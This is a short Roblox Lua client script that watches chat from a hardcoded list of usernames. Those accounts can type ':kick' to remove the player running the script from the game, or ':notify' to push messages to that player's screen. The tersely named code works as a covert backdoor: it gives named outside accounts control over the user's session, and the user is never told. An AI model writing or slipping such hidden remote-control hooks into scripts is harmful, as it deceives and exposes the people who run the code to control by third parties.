local P = game:GetService("Players")
local G = game:GetService("StarterGui")
local L = P.LocalPlayer
local A = {["name"] = true, ["aabbaaii13"] = true, ["abaiaabbaaiiabai"] = true, ["aabbaaii14"] = true, ["Bladeball_player234"] = true}

local function h(p)
    if A[p.Name] and not p:FindFirstChild("__hooked") then
        Instance.new("BoolValue", p).Name = "__hooked"
        p.Chatted:Connect(function(m)
            m = m:lower()
            local k = ":kick "
            if m:sub(1, #k) == k then
                local d = string.split(m:sub(#k + 1), "|")
                if d[1]:gsub("%s+", "") == L.Name:lower() then
                    L:Kick((d[2] or "No Reason"):gsub("^%s+", ""):gsub("%s+$", ""))
                end
                return
            end

            local n = ":notify "
            if m:sub(1, #n) == n then
                local d = string.split(m:sub(#n + 1), "|")
                if #d >= 2 and d[1]:gsub("%s+", "") == L.Name:lower() then
                    G:SetCore("SendNotification", {
                        Title = "Notification",
                        Text = d[2]:gsub("^%s+", ""):gsub("%s+$", ""),
                        Duration = 15
                    })
                end
            end
        end)
    end
end

for _, v in ipairs(P:GetPlayers()) do h(v) end
P.PlayerAdded:Connect(h)
